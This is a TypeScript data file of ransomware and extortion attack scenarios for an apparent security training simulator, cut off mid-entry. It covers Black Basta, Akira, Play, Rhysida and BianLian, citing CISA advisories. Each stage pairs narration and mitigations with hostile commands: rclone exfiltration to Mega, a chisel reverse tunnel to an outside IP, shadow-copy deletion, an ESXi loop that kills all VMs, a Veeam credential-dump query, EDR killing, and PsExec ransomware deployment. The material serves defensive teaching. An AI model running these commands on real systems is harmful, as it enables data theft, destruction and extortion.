import { LegacyDraftScenario } from './normalize-legacy-draft-scenario';

export const APT_BATCH9_RANSOMWARE_EXTORTION_SCENARIOS: LegacyDraftScenario[] = [
  {
    id: 'blackbasta-qakbot-backstab-ransomware',
    title: 'Black Basta Teams Vishing, Quick Assist, Backstab EDR Bypass & ChaCha20 (AA24-131A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Black Basta affiliates (Storm-1811) flood victim mailboxes with spam before calling over Microsoft Teams impersonating IT Help Desk to coerce Windows Quick Assist execution, deploy Backstab (PROCEXP.SYS BYOVD) to blind EDR, and detonate ChaCha20/RSA-4096 encryption (.basta).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Storm-1811 / Black Basta Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Microsoft Teams External Federation', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Workstation (QuickAssist.exe Session)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-131A / Defender XDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Shares (.basta ChaCha20)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse',
        narration:
          'Storm-1811 floods an employee’s corporate email inbox with thousands of newsletter signups, then calls the user via external Microsoft Teams federated chat impersonating "IT Security Help Desk" and convinces them to press Ctrl+Win+Q to launch Microsoft’s built-in QuickAssist.exe remote support tool.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1566.004 - Spearphishing Voice / T1219 - Remote Access Software)',
        technicalCommands: [
          'C:\\Windows\\System32\\QuickAssist.exe (User enters 6-digit operator security code over Microsoft Teams call)',
          'QuickAssist WebView2 session connects to *.remoteassistance.support.services.microsoft.com',
        ],
        defenseMitigation:
          'Restrict Microsoft Teams external federation to an explicit domain allowlist and block or remove `QuickAssist.exe` via AppLocker/Intune policies.',
        logs: [
          {
            id: 'basta-1',
            timestamp: '10:04:18.210',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'QuickAssist.exe',
            CommandLine: 'C:\\Windows\\System32\\QuickAssist.exe',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\QuickAssist.exe | PrecedingSignal: Inbound External Teams Call from "HelpDesk_Admin@onmicrosoft.com" + 1,800 SMTP Spam Messages | ChildProcess: powershell.exe / curl.exe',
            parsedFields: {
              SocialEngineeringVector: 'Email Bombing + External Microsoft Teams Vishing (Storm-1811)',
              RemoteSupportLolbin: 'C:\\Windows\\System32\\QuickAssist.exe',
              AdvisoryId: 'CISA AA24-131A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging',
        narration:
          'Through the interactive Quick Assist session, the operator downloads payloads via cURL/MSI, uses Backstab (loading PROCEXP.SYS to close EDR file/process handles), scans the AD network with SoftPerfect netscan.exe, and exfiltrates files with rclone.exe.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Discovery (T1562.001 / T1046)',
        technicalCommands: [
          'backstab.exe -p MsMpEng.exe -k -d C:\\Users\\Public\\PROCEXP.SYS (Closes all kernel handles held by EDR)',
          'netscan.exe /hide && rclone.exe copy "\\\\fileserver\\corp" mega:basta_dump --transfers 16',
        ],
        defenseMitigation:
          'Monitor child processes spawned during active `QuickAssist.exe` sessions (`cmd.exe`, `powershell.exe`, `msiexec.exe`, `curl.exe`) and block `PROCEXP.SYS` via WDAC.',
        logs: [
          {
            id: 'basta-2',
            timestamp: '10:12:44.605',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'backstab.exe',
            CommandLine: 'C:\\Users\\Public\\backstab.exe -n MsMpEng.exe -k',
            raw: 'EDR Defense Evasion Alert | Tool: Backstab (BYOVD Handle Killer) | LoadedDriver: PROCEXP.SYS | ReconTool: SoftPerfect Network Scanner (netscan.exe) | ExfilTool: rclone.exe',
            parsedFields: {
              EdrEvasionTool: 'Backstab (PROCEXP.SYS IOCTL Handle Stripping)',
              NetworkScanner: 'SoftPerfect netscan.exe',
              ExfiltrationTool: 'rclone.exe',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)',
        narration:
          'Using PsExec or PowerShell Invoke-Command across the domain, the operator deletes Volume Shadow Copies with vssadmin.exe, disables DNS/DHCP services if running in safe-mode, and encrypts files in 64-byte intermittent chunks using ChaCha20 and RSA-4096, appending the .basta extension.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1490)',
        technicalCommands: [
          'vssadmin.exe delete shadows /all /quiet',
          'basta.exe -forcepath "\\\\corp-nas\\shares" (XChaCha20 + RSA-4096 encryption -> readme.faa.txt & .basta)',
        ],
        defenseMitigation:
          'Enforce SMB signing, block PsExec (`PSEXESVC.exe`) lateral service creation, and maintain immutable air-gapped backups.',
        logs: [
          {
            id: 'basta-3',
            timestamp: '10:45:02.119',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'basta.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\basta.exe | TargetFilename: \\\\corp-nas\\shares\\readme.faa.txt | Cipher: XChaCha20 + RSA-4096 | AppendedExtension: .basta',
            parsedFields: {
              RansomwareFamily: 'Black Basta',
              EncryptionAlgorithm: 'ChaCha20 (Intermittent 64-byte blocks) + RSA-4096',
              RansomNote: 'readme.faa.txt',
              FileExtension: '.basta',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'akira-ransomware-cisco-anyconnect-esxi',
    title: 'Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Akira ransomware affiliates breach perimeter Cisco ASA/FTD AnyConnect VPN appliances (CVE-2020-3259 / CVE-2023-20269), establish Chisel/ngrok tunnels, extract VMware vCenter/ESXi credentials, run esxcli vm process kill on hypervisors, and deploy the Rust/C++ Akira ESXi encryptor.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Akira Affiliate Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Cisco ASA / AnyConnect VPN Appliance', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Jump Host (Chisel & Mimikatz)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-109A / Sophos MDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'VMware ESXi Host (esxcli + Rust Akira)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)',
        narration:
          'Akira affiliates exploit CVE-2023-20269 (unauthorized brute-force/access on Cisco ASA/FTD SSL VPN) or CVE-2020-3259 memory disclosure to authenticate to a single-factor AnyConnect VPN profile without MFA.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1133 - External Remote Services / T1190)',
        technicalCommands: [
          'GET /+CSCOE+/session_password.html HTTP/1.1 (Cisco ASA AnyConnect SSL VPN Login)',
          'Exploit CVE-2023-20269 / CVE-2020-3259 -> Establish AnyConnect DTLS tunnel',
        ],
        defenseMitigation:
          'Patch Cisco ASA/FTD firmware for CVE-2023-20269 and CVE-2020-3259, disable legacy DefaultWEBVPNGroup profiles, and require phishing-resistant MFA on all VPN connection profiles.',
        logs: [
          {
            id: 'akira-1',
            timestamp: '01:14:09.104',
            source: 'Firewall',
            severity: 'critical',
            raw: '%ASA-6-722022: Group <DefaultWEBVPNGroup> User <vendor_support> IP <185.220.101.42> SVC Message: 16/NOTICE: The user has connected | MFA: None (CVE-2023-20269)',
            parsedFields: {
              Appliance: 'Cisco ASA / Firepower Threat Defense',
              VpnGroup: 'DefaultWEBVPNGroup',
              ExploitedCve: 'CVE-2023-20269 / CVE-2020-3259',
              AdvisoryId: 'CISA AA24-109A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi',
        narration:
          'Pivoting onto an internal Windows server, the operator runs Chisel to establish a reverse SOCKS5 proxy over HTTP, extracts stored credentials from the Veeam Backup SQL database and LSASS, and opens an SSH session to the VMware ESXi hypervisors.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access & Command and Control (T1555 / T1572)',
        technicalCommands: [
          'chisel.exe client https://185.220.101.42:8443 R:socks',
          'sqlcmd -S localhost\\VEEAMSQL2016 -Q "SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials]"',
        ],
        defenseMitigation:
          'Isolate Veeam backup servers and ESXi management interfaces (`vmk0`) onto dedicated out-of-band management VLANs and disable ESXi SSH (`TSM-SSH`) by default.',
        logs: [
          {
            id: 'akira-2',
            timestamp: '01:28:33.719',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'chisel.exe',
            CommandLine: 'C:\\ProgramData\\chisel.exe client https://185.220.101.42:8443 R:socks',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\chisel.exe | CommandLine: chisel.exe client https://185.220.101.42:8443 R:socks | FollowUp: VeeamBackup Credentials SQL query & SSH to ESXi hypervisor',
            parsedFields: {
              TunnelTool: 'Chisel (HTTP Reverse SOCKS5 Proxy)',
              CredentialSource: 'VeeamBackup SQL Database ([dbo].[Credentials])',
              LateralProtocol: 'SSH (TCP/22) to VMware ESXi Host',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption',
        narration:
          'On the ESXi hypervisor shell, the operator runs a one-line loop invoking esxcli vm process list and esxcli vm process kill --type=force to immediately power off all running virtual machines (unlocking their .vmdk files), then launches the Rust-compiled Akira ELF binary (`megazord` / `akira_esxi`) to encrypt `/vmfs/volumes`.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1489 - Service Stop / T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'for i in $(esxcli vm process list | grep "World ID:" | awk \'{print $3}\'); do esxcli vm process kill --type=force --world-id=$i; done',
          'nohup /tmp/akira_esxi -p /vmfs/volumes --fork & (Encrypts .vmdk, .vmx, .vswp, .vmsn with ChaCha20/RSA)',
        ],
        defenseMitigation:
          'Enable vSphere 8+ Lockdown Mode (disabling direct root SSH access to ESXi hosts) and forward `/var/log/shell.log` in real time to alert on `esxcli vm process list/kill`.',
        logs: [
          {
            id: 'akira-3',
            timestamp: '01:41:12.005',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'esxcli',
            CommandLine: 'esxcli vm process kill --type=force --world-id=2104892',
            raw: 'ESXi /var/log/shell.log Alert | User: root | Command: esxcli vm process kill --type=force --world-id=2104892 | NextCommand: /tmp/akira_esxi -p /vmfs/volumes --fork | TargetFiles: *.vmdk, *.vmx -> *.akira',
            parsedFields: {
              VmTerminationCommand: 'esxcli vm process kill --type=force',
              HypervisorEncryptor: '/tmp/akira_esxi (Rust ELF Binary)',
              TargetedDatastores: '/vmfs/volumes (*.vmdk, *.vmx, *.vswp)',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'play-ransomware-grixba-vss-copy',
    title: 'Play Ransomware Grixba Recon, AlphaVSS Shadow Copy Theft & Intermittent Encryption (AA23-352A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Play (Playcrypt) ransomware operators deploy their custom .NET reconnaissance scanner (Grixba / inf_g.exe) disguised as a SentinelOne binary, abuse the AlphaVSS .NET library to read locked files directly from Volume Shadow Copies before deleting them, and execute intermittent AES-RSA encryption (.play).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Play Ransomware Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Compromised RDP / FortiOS / Exchange', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Grixba .NET Scanner (inf_g.exe)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA23-352A / Symantec EDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'AlphaVSS Shadow Access & .play Shares', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Deploying Custom Grixba .NET Reconnaissance Scanner (inf_g.exe)',
        narration:
          'After gaining initial access, Play operators unpack Grixba (inf_g.exe, masquerading with a SentinelOne icon) using Costura.Fody embedded .NET assemblies to enumerate all domain hosts, WMI security products, backup catalogs, and RDP sessions into encrypted .zip archives.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Discovery & Collection (T1046 / T1560.001)',
        technicalCommands: [
          'C:\\Users\\Public\\Music\\inf_g.exe -m:all -d:corp.local (Grixba .NET Reconnaissance Scanner)',
          'Output: ExportData.db compressed into password-protected ExportData.zip',
        ],
        defenseMitigation:
          'Alert on unsigned `.NET` binaries loading `Costura.Fody` embedded resources from `C:\\Users\\Public\\Music\\` that perform high-volume WMI, WinRM, and Remote Registry queries.',
        logs: [
          {
            id: 'play-1',
            timestamp: '03:11:20.412',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'inf_g.exe',
            CommandLine: 'C:\\Users\\Public\\Music\\inf_g.exe -m:all -d:corp.local',
            raw: 'EventID: 1 | Image: C:\\Users\\Public\\Music\\inf_g.exe | Description: SentinelOne (Masqueraded) | Tool: Grixba (.NET Recon Scanner) | Action: Enumerated WMI AntivirusProduct, Backup Services, and Domain Admins',
            parsedFields: {
              CustomReconTool: 'Grixba (inf_g.exe)',
              CliFlags: '-m:all -d:corp.local',
              AdvisoryId: 'CISA AA23-352A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: AlphaVSS .NET Shadow Copy Mounting for Locked Database Exfiltration',
        narration:
          'To steal in-use SQL databases and NTDS.dit without triggering vssadmin.exe command-line alerts, Play operators deploy a custom VSS Copying Tool built on the AlphaVSS .NET library (AlphaFS.dll / AlphaVSS.x64.dll) to programmatically create, read from, and then delete Volume Shadow Copies via COM.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Collection & Defense Evasion (T1006 - Direct Volume Access / T1490)',
        technicalCommands: [
          'vss_copy.exe -> Loads AlphaVSS.x64.dll (Calls IVssBackupComponents COM interface directly)',
          'Copies locked SQL .mdf & ntds.dit from \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\ -> Deletes shadow copy',
        ],
        defenseMitigation:
          'Monitor `VSSEvent` EventID 8222 and COM instantiations of `CLSID_VssBackupComponents` (`{65EE1DBA-8FF4-4a58-AC1C-3470EE2F376A}`) by non-backup processes rather than relying solely on `vssadmin.exe` process creation rules.',
        logs: [
          {
            id: 'play-2',
            timestamp: '03:24:09.881',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 7,
            ProcessName: 'vss_copy.exe',
            raw: 'EventID: 7 (ImageLoaded) | Image: C:\\Users\\Public\\Music\\vss_copy.exe | ImageLoaded: AlphaVSS.x64.dll & AlphaFS.dll | Action: Programmatic VSS snapshot creation, locked file exfiltration, and snapshot deletion without vssadmin.exe',
            parsedFields: {
              DotNetLibrary: 'AlphaVSS.x64.dll / AlphaFS.dll',
              ComInterface: 'IVssBackupComponents (Direct VSS COM API)',
              EvasionBenefit: 'Bypasses vssadmin.exe / wmic.exe command-line detections',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: WinPE APIUnhooking & Intermittent 0x100000-Byte Chunk Encryption (.play)',
        narration:
          'Deploying the Play ransomware binary via Group Policy Objects (GPO), the encryptor resolves Windows APIs dynamically by walking the PEB, checks if files already end with .play or contain deadbeef, and encrypts only 2, 3, or 5 specific 1MB (0x100000) chunks of large files using AES-CBC and RSA-4096.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'Play Encryptor: Intermittent encryption of 0x100000-byte (1MB) blocks based on file size',
          'Appends .play extension and writes single-word ransom note ReadMe.txt ("PLAY" + contact email)',
        ],
        defenseMitigation:
          'Deploy canary files and behavioral ransomware drivers that detect rapid intermittent seek-and-overwrite I/O patterns (`IRP_MJ_WRITE` at 1MB stride intervals).',
        logs: [
          {
            id: 'play-3',
            timestamp: '03:50:14.205',
            source: 'EDR',
            severity: 'critical',
            EventCode: 11,
            raw: 'EDR Intermittent Encryption Alert | Process: C:\\Windows\\System32\\svchost_play.exe | Pattern: Stride 0x100000 (1MB) Intermittent AES-RSA Overwrite | MarkerFooter: 0xdeadbeef | AppendedExtension: .play | NoteFile: ReadMe.txt',
            parsedFields: {
              EncryptionMode: 'Intermittent 1MB (0x100000) Chunk Encryption (AES + RSA)',
              FileFooterMarker: 'deadbeef',
              AppendedExtension: '.play',
              RansomNote: 'ReadMe.txt',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'rhysida-ransomware-zerologon-ps-silentskill',
    title: 'Rhysida Ransomware SilentKill PowerShell Preparation, PortStarter & LibTomCrypt AES-CTR (AA23-319A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Rhysida ransomware operators (overlapping Vice Society / DEV-0832) deploy the PortStarter Golang firewall-opening backdoor, execute the SilentKill PowerShell script (g.ps1) to terminate 200+ AV/backup services and modify RDP registry keys, and run the LibTomCrypt-based Rhysida encryptor (AES-256-CTR + RSA-4096).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Rhysida Affiliate (Vice Society Nexus)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'PortStarter Go Backdoor (Firewall Rule)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'SilentKill PowerShell Script (g.ps1)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA23-319A / Sekoia XDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'LibTomCrypt AES-256-CTR (.rhysida)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: PortStarter Golang Backdoor & Windows Firewall Rule Tampering',
        narration:
          'Following initial VPN/Phishing access, the operator deploys PortStarter—a custom Golang backdoor shared with Vice Society that registers as a Windows service, adds an inbound Windows Firewall rule (`netsh advfirewall firewall add rule`), and listens on a high TCP port for mTLS C2 commands.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Persistence & Defense Evasion (T1562.004 - Disable or Modify System Firewall)',
        technicalCommands: [
          'sc.exe create WinDefendUpdate binPath= "C:\\ProgramData\\portstarter.exe"',
          'netsh advfirewall firewall add rule name="Windows Update Service" dir=in action=allow protocol=TCP localport=49155',
        ],
        defenseMitigation:
          'Monitor Windows Firewall EventID 2004 (rule added) and Sysmon EventID 1 invocations of `netsh advfirewall firewall add rule` opening inbound TCP ports on internal hosts.',
        logs: [
          {
            id: 'rhy-1',
            timestamp: '02:09:14.330',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'netsh.exe',
            CommandLine: 'netsh advfirewall firewall add rule name="Windows Update Service" dir=in action=allow protocol=TCP localport=49155',
            raw: 'EventID: 1 | ParentImage: C:\\ProgramData\\portstarter.exe (Go Binary) | Image: C:\\Windows\\System32\\netsh.exe | CommandLine: netsh advfirewall firewall add rule ... localport=49155 | Note: Vice Society / Rhysida PortStarter implant',
            parsedFields: {
              ImplantName: 'PortStarter (Golang Firewall Backdoor)',
              FirewallCommand: 'netsh advfirewall firewall add rule ... localport=49155',
              AdvisoryId: 'CISA AA23-319A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: SilentKill PowerShell Script (g.ps1) Disabling 200+ Services & Unhooking AMSI',
        narration:
          'Prior to encryption, the operator runs SilentKill (g.ps1)—a comprehensive PowerShell preparation script that patches AmsiScanBuffer in memory, stops over 200 hardcoded antivirus, SQL, Exchange, and backup services, deletes shadow copies, and enables RestrictedAdmin RDP.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion & Service Stop (T1562.001 / T1489)',
        technicalCommands: [
          'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\g.ps1 (SilentKill)',
          'Stop-Service -Name "Veeam*","SQL*","Sophos*","SepMasterService" -Force; reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f',
        ],
        defenseMitigation:
          'Enforce PowerShell Constrained Language Mode (CLM) and ScriptBlock Logging (EventID 4104) to detect bulk `Stop-Service` loops and `DisableRestrictedAdmin` registry modifications.',
        logs: [
          {
            id: 'rhy-2',
            timestamp: '02:18:45.102',
            source: 'EDR',
            severity: 'critical',
            EventCode: 4104,
            ProcessName: 'powershell.exe',
            raw: 'PowerShell ScriptBlock Alert (EventID 4104) | Script: C:\\Users\\Public\\g.ps1 (SilentKill) | Actions: Patched amsi.dll, executed Stop-Service across 214 AV/DB/Backup services, enabled RDP RestrictedAdmin',
            parsedFields: {
              PreparationScript: 'SilentKill (g.ps1)',
              StoppedServicesCount: '214 AV, Database, and Backup Services',
              RegistryModified: 'HKLM\\...\\Lsa\\DisableRestrictedAdmin = 0',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Multi-Threaded LibTomCrypt AES-256-CTR Encryption & Desktop Wallpaper Lock (.rhysida)',
        narration:
          'Distributed across the domain via PsExec (`-d -s cmd.exe`), the 64-bit MinGW-compiled Rhysida binary uses the statically linked LibTomCrypt library to encrypt files with AES-256-CTR and a 4096-bit RSA public key, appending .rhysida, dropping CriticalBreachDetected.pdf, and changing the desktop wallpaper.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1491.001 - Internal Defacement)',
        technicalCommands: [
          'psexec.exe \\\\* -u CORP\\admin -p <pass> -d -s cmd.exe /c "C:\\Windows\\Temp\\rhysida.exe -d C:\\"',
          'LibTomCrypt AES-256-CTR + RSA-4096 -> Appends .rhysida & drops CriticalBreachDetected.pdf',
        ],
        defenseMitigation:
          'Block `PsExec` (`PSEXESVC`) execution via Windows Firewall and Endpoint ASR rules, and monitor for binaries statically linking `LibTomCrypt` strings (`ctr_start`, `aes_setup`, `rsa_import`).',
        logs: [
          {
            id: 'rhy-3',
            timestamp: '02:25:19.770',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'rhysida.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\rhysida.exe (MinGW C++ / LibTomCrypt) | TargetFilename: C:\\Users\\Admin\\Desktop\\CriticalBreachDetected.pdf | Cipher: AES-256-CTR + RSA-4096 | Extension: .rhysida',
            parsedFields: {
              CryptoLibrary: 'LibTomCrypt v1.18.2 (AES-256-CTR + RSA-4096)',
              RansomNotePdf: 'CriticalBreachDetected.pdf',
              AppendedExtension: '.rhysida',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'bianlian-extortion-go-backdoor-rdp',
    title: 'BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion (AA23-136A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1048',
    description:
      'BianLian operators abandon file encryption in favor of pure data-exfiltration extortion (AA23-136A). They deploy a custom cross-compiled Golang mTLS backdoor containing an embedded go-socks5 server, enumerate AD shares via SharpShares, and exfiltrate terabytes of data over rclone and FileZilla without triggering ransomware file-write sensors.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'BianLian Extortion C2 & Mega/FTP Drop', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Golang mTLS Backdoor (Windows/Linux)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Embedded go-socks5 Memory Proxy', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA23-136A / Red Canary Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Pure Exfiltration (rclone / SharpShares)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning',
        narration:
          'BianLian compiles a unique per-victim 64-bit Golang binary (disguised as SystemSettingsAdminFlows.exe or Win64Ark.exe) that connects outbound over mutual TLS (mTLS) with hardcoded client/server X.509 certificates to an attacker C2 IP.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Command and Control (T1573.002 - Asymmetric Cryptography / mTLS)',
        technicalCommands: [
          'C:\\Windows\\Temp\\SystemSettingsAdminFlows.exe (Golang binary with main.run & main.backconnect)',
          'mTLS Handshake: Presents embedded client X.509 cert to C2 IP:443',
        ],
        defenseMitigation:
          'Hunt for unsigned Golang binaries (`Go build ID`) executing from `C:\\Windows\\Temp` or `C:\\ProgramData` that initiate long-lived TLS sessions to uncategorized IP literals without a preceding DNS lookup.',
        logs: [
          {
            id: 'bian-1',
            timestamp: '05:14:02.118',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 3,
            ProcessName: 'SystemSettingsAdminFlows.exe',
            raw: 'EventID: 3 (NetworkConnect) | Image: C:\\Windows\\Temp\\SystemSettingsAdminFlows.exe (Unsigned Golang Binary) | DestinationIp: 198.51.100.142 | DestinationPort: 443 | GoSymbols: main.backconnect, github.com/armon/go-socks5 | Advisory: CISA AA23-136A',
            parsedFields: {
              MalwareFamily: 'BianLian Custom Golang Backdoor',
              EmbeddedGoPackages: 'main.backconnect, github.com/armon/go-socks5, github.com/hashicorp/yamux',
              C2Protocol: 'Mutual TLS (mTLS) to Raw IP Literal',
            },
          },
        ],
        packets: [
          {
            id: 'bian-pkt-1',
            timestamp: '05:14:02.110',
            protocol: 'TCP',
            sourceIp: '10.20.10.55',
            destIp: '198.51.100.142',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 512,
            hexDump: '16 03 03 01 F0 01 00 01 EC 03 03 62 69 61 6E 6C 69 61 6E 5F 6D 74 6C 73 5F 79 61 6D 75 78',
            decodedString: 'mTLS ClientHello + Certificate (Self-Signed X.509 Pinning over HashiCorp Yamux Multiplexer)',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot',
        narration:
          'Inside the mTLS connection, the Golang implant uses HashiCorp’s yamux stream multiplexer and armon/go-socks5 to expose an in-memory SOCKS5 proxy to the operator, allowing the attacker to run Impacket, RDP, and SharpShares from their external C2 directly into internal subnets.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Command and Control (T1090.001 - Internal Proxy / SOCKS5)',
        technicalCommands: [
          'Go Routine: yamux.Server(tlsConn, nil) -> socks5.New(&socks5.Config{})',
          'SharpShares.exe /threads:50 /filter:SYSVOL,NETLOGON,IPC$',
        ],
        defenseMitigation:
          'Monitor internal East-West SMB (445), LDAP (389), and RDP (3389) connections originating from a single workstation or server that is simultaneously holding a high-throughput outbound TLS socket.',
        logs: [
          {
            id: 'bian-2',
            timestamp: '05:19:33.504',
            source: 'EDR',
            severity: 'critical',
            raw: 'Lateral Movement via Embedded SOCKS5 Proxy | ProxyHost: 10.20.10.55 (SystemSettingsAdminFlows.exe) | Multiplexer: hashicorp/yamux | DownstreamConnections: 142 internal SMB (445) & LDAP (389) connections via SharpShares',
            parsedFields: {
              MultiplexerLibrary: 'github.com/hashicorp/yamux + armon/go-socks5',
              DiscoveryTool: 'SharpShares.exe',
              LateralFootprint: 'Zero secondary implants needed on target SMB file servers',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)',
        narration:
          'Rather than deploying a file encryptor (which triggers behavioral ransomware rollbacks and gives victims no incentive to prevent publication once backups are restored), BianLian renames rclone.exe to Win.exe, exfiltrates sensitive legal, financial, and healthcare databases to Mega.io / FTP servers, and drops a pure-extortion note.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Exfiltration (T1567.002 - Exfiltration to Cloud Storage / T1048)',
        technicalCommands: [
          'C:\\ProgramData\\Win.exe (renamed rclone.exe) copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault --bwlimit 50M',
          'Drop extortion note: Look_at_this_file.txt (No file encryption performed)',
        ],
        defenseMitigation:
          'Block outbound access to consumer cloud storage APIs (`*.mega.co.nz`, `api.mega.co.nz`, `pcloud.com`) and match `rclone.exe` by PE metadata (`OriginalFileName: rclone.exe` / Go symbol table) regardless of binary rename.',
        logs: [
          {
            id: 'bian-3',
            timestamp: '06:02:11.908',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'Win.exe',
            CommandLine: 'C:\\ProgramData\\Win.exe copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault --bwlimit 50M',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\Win.exe | OriginalFileName: rclone.exe | CommandLine: Win.exe copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault | ExtortionModel: Pure Exfiltration (Zero Files Encrypted)',
            parsedFields: {
              RenamedBinary: 'C:\\ProgramData\\Win.exe (OriginalFileName: rclone.exe)',
              ExfiltrationDestination: 'Mega.io Cloud Storage & External FTP',
